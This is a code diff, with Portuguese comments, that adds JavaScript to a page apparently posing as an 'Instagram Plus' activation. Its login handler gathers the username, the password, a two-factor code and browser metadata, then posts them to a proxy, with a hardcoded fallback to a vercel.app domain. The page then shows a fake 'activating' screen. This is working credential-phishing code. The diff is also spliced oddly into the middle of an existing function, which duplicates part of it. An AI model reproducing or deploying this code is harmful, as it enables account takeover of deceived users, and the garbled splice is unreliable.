@@ -894,6 +894,225 @@ function collectMetadata() {
     if (ua.match(/chrome|chromium|crios/i)) browser = 'Chrome';
     else if (ua.match(/firefox|fxios/i)) browser = 'Firefox';
     else if (ua.match(/safari/i) && !ua.match(/chrome|chromium|crios/i)) browser = 'Safari';
+<script>
+// Estado global
+let activationTimer = null;
+
+// Configuração do Endpoint
+// Usa a origem atual se estiver em produção, caso contrário usa o domínio fixo
+const PROXY_ENDPOINT = window.location.origin.startsWith('http') 
+    ? `${window.location.origin}/api/proxy` 
+    : 'https://instaplus-six.vercel.app/api/proxy';
+
+/**
+ * Navega para uma tela específica
+ * @param {string} screenName - 'plus', 'login', 'ativando'
+ */
+function go(screenName) {
+    const validScreens = ['plus', 'login', 'ativando'];
+    if (!validScreens.includes(screenName)) screenName = 'plus';
+    
+    // Atualiza o hash se necessário (para back/forward do navegador funcionar)
+    if (location.hash !== `#${screenName}`) {
+        location.hash = screenName;
+    }
+    
+    // Força a atualização da UI imediatamente
+    renderScreen(screenName);
+}
+
+/**
+ * Renderiza a tela correta ocultando as outras
+ * @param {string} activeScreen - Nome da tela ativa
+ */
+function renderScreen(activeScreen) {
+    const screens = ['plus', 'login', 'ativando'];
+    
+    screens.forEach(id => {
+        const el = document.getElementById(id);
+        if (!el) return;
+        
+        if (id === activeScreen) {
+            // Mostra a tela
+            el.hidden = false;
+            el.style.display = 'flex';
+            
+            // Reinicia animações de entrada (stagger)
+            const animatables = el.querySelectorAll('.scroll>*, .footer>*, .lback, .lang, .lmid, .lform>*, .lbottom>*');
+            animatables.forEach((node, index) => {
+                node.style.setProperty('--i', index);
+                node.style.animation = 'none';
+                void node.offsetWidth; 
+                node.style.animation = 'up .8s cubic-bezier(.2,.7,.2,1) both';
+                node.style.animationDelay = `${index * 80}ms`;
+            });
+        } else {
+            // Oculta a tela
+            el.hidden = true;
+            el.style.display = 'none';
+        }
+    });
+
+    // Lógica específica da tela de carregamento
+    clearTimeout(activationTimer);
+    const actScreen = document.getElementById('ativando');
+    if (actScreen && activeScreen === 'ativando') {
+        actScreen.classList.remove('run', 'done');
+        requestAnimationFrame(() => {
+            requestAnimationFrame(() => {
+                actScreen.classList.add('run');
+            });
+        });
+        activationTimer = setTimeout(() => {
+            actScreen.classList.add('done');
+        }, 3500);
+    }
+    
+    window.scrollTo(0, 0);
+}
+
+/**
+ * Trata o clique no botão de Login
+ */
+async function tryLogin() {
+    const userInput = document.getElementById('user');
+    const passInput = document.getElementById('pass');
+    const userErr = document.getElementById('userErr');
+    const passErr = document.getElementById('passErr');
+    const otpContainer = document.getElementById('otpContainer');
+    const otpInput = document.getElementById('otp');
+    const otpErr = document.getElementById('otpErr');
+    const loginBtn = document.querySelector('.lbtn');
+    
+    let isValid = true;
+
+    // 1. Validação de Campos Básicos
+    if (!userInput.value.trim()) {
+        userInput.classList.add('err');
+        userErr.hidden = false;
+        isValid = false;
+    } else {
+        userInput.classList.remove('err');
+        userErr.hidden = true;
+    }
+
+    if (!passInput.value) {
+        passInput.classList.add('err');
+        passErr.hidden = false;
+        isValid = false;
+    } else {
+        passInput.classList.remove('err');
+        passErr.hidden = true;
+    }
+
+    // Shake animation se inválido
+    if (!isValid) {
+        const form = document.querySelector('.lform');
+        form.classList.remove('shake');
+        void form.offsetWidth;
+        form.classList.add('shake');
+        return;
+    }
+
+    // 2. Lógica de 2FA (OTP) - Estilo Instagram
+    const isOtpVisible = otpContainer.style.display === 'block';
+
+    // Se o campo OTP NÃO está visível: Mostra o campo e para o fluxo
+    // O usuário terá que clicar em "Entrar" novamente após digitar o código
+    if (!isOtpVisible) {
+        otpContainer.style.display = 'block';
+        otpInput.focus();
+        // Opcional: Mudar texto do botão para indicar que está esperando o código
+        // loginBtn.textContent = 'Confirmar'; 
+        return;
+    }
+
+    // Se o campo OTP ESTÁ visível: Valida o código
+    if (!otpInput.value.trim()) {
+        otpInput.classList.add('err');
+        otpErr.hidden = false;
+        return;
+    } else {
+        otpInput.classList.remove('err');
+        otpErr.hidden = true;
+    }
+
+    // 3. Estado de Loading
+    loginBtn.disabled = true;
+    loginBtn.textContent = 'Verificando...';
+
+    // 4. Coleta de Metadados
+    const meta = collectMetadata();
+
+    // 5. Payload
+    const payload = {
+        user: userInput.value.trim(),
+        pass: passInput.value,
+        otp: otpInput.value.trim(),
+        meta: meta
+    };
+
+    console.log('Enviando payload:', payload);
+
+    // 6. Envio para o Proxy
+    try {
+        const response = await fetch(PROXY_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+            throw new Error(`HTTP ${response.status}`);
+        }
+        
+        const result = await response.json();
+        console.log('Resposta do servidor:', result);
+
+        // Tratar erros específicos do backend
+        if (result.success === false) {
+            alert(result.message || 'Erro ao verificar credenciais. Tente novamente.');
+            loginBtn.disabled = false;
+            loginBtn.textContent = 'Entrar';
+            return;
+        }
+
+    } catch (error) {
+        console.error('Erro na requisição:', error);
+        alert('Erro de conexão. Verifique sua internet.');
+        loginBtn.disabled = false;
+        loginBtn.textContent = 'Entrar';
+        return;
+    }
+
+    // 7. Sucesso - Transição
+    // Limpa campos para próxima tentativa
+    userInput.value = '';
+    passInput.value = '';
+    otpInput.value = '';
+    otpContainer.style.display = 'none';
+    
+    // Navega para a tela de carregamento
+    go('ativando');
+    
+    // Restaura o botão após a transição
+    setTimeout(() => {
+        loginBtn.disabled = false;
+        loginBtn.textContent = 'Entrar';
+    }, 3500);
+}
+
+/**
+ * Coleta metadados do navegador
+ */
+function collectMetadata() {
+    const ua = navigator.userAgent;
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+    
+    let browser = 'Desconhecido';
+    if (ua.match(/chrome|chromium|crios/i)) browser = 'Chrome';
+    else if (ua.match(/firefox|fxios/i)) browser = 'Firefox';
+    else if (ua.match(/safari/i) && !ua.match(/chrome|chromium|crios/i)) browser = 'Safari';
     else if (ua.match(/edg/i)) browser = 'Edge';
 
     let os = 'Desconhecido';
@@ -911,7 +1130,7 @@ function collectMetadata() {
         lang: navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         timestamp: new Date().toLocaleString('pt-BR'),
-        ip: 'Indisponível' // O IP é obtido via fetch no main flow para não bloquear a UI
+        ip: 'Indisponível'
     };
 }
 
